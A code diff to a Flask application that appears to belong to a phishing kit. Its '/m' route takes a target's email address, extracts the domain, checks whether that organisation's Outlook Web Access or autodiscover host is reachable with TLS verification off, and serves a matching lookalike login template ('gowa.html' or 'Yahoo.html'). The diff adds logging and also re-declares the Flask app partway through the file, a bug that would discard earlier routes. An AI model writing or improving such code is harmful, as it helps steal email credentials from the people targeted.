@@ -170,6 +170,13 @@ def success():
         return redirect(url_for('captcha'))
 
 
+from flask import Flask, request, render_template, session
+import requests
+from urllib.parse import urljoin
+
+app = Flask(__name__)
+app.secret_key = "your_secret_key"  # Required for session handling
+
 @app.route("/m")
 def route2():
     web_param = request.args.get('web')
@@ -177,32 +184,37 @@ def route2():
     if web_param:
         session['eman'] = web_param
         session['ins'] = web_param.split('@')[-1]  # Extract domain
-
-        owa_url = urljoin(f"https://owa.{session['ins']}", "/owa/#path=/mail")
-        autodiscover_url = urljoin(f"https://autodiscover.{session['ins']}", "/owa/#path=/mail/search")
+        
+        app.logger.info(f"Extracted domain: {session['ins']}")  # Flask logging
 
         if session['ins'] == "gmail.com":
             return render_template('gowa.html', eman=session.get('eman'), ins=session.get('ins'))
         if session['ins'] == "yahoo.com":
             return render_template('Yahoo.html', eman=session.get('eman'), ins=session.get('ins'))
-        
+
+        owa_url = urljoin(f"https://owa.{session['ins']}", "/owa/#path=/mail")
+        autodiscover_url = urljoin(f"https://autodiscover.{session['ins']}", "/owa/#path=/mail/search")
+
         # Check which URL is accessible and render OWA page if found
         try:
-            owa_status = requests.get(owa_url, verify=False).status_code == 200
-            if owa_status:
+            response = requests.get(owa_url, verify=False)
+            if response.status_code == 200:
+                app.logger.info(f"OWA URL is accessible: {owa_url}")
                 return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'), owa_url=owa_url)
         except requests.exceptions.RequestException:
-            pass  # Ignore errors and proceed
+            app.logger.warning(f"OWA URL not accessible: {owa_url}")
 
         try:
-            autodiscover_status = requests.get(autodiscover_url, verify=False).status_code == 200
-            if autodiscover_status:
+            response = requests.get(autodiscover_url, verify=False)
+            if response.status_code == 200:
+                app.logger.info(f"Autodiscover URL is accessible: {autodiscover_url}")
                 return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'), owa_url=autodiscover_url)
         except requests.exceptions.RequestException:
-            pass  # Ignore errors and proceed
+            app.logger.warning(f"Autodiscover URL not accessible: {autodiscover_url}")
 
         return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'))
-	return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
+    
+    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
 @app.route("/first", methods=['POST'])
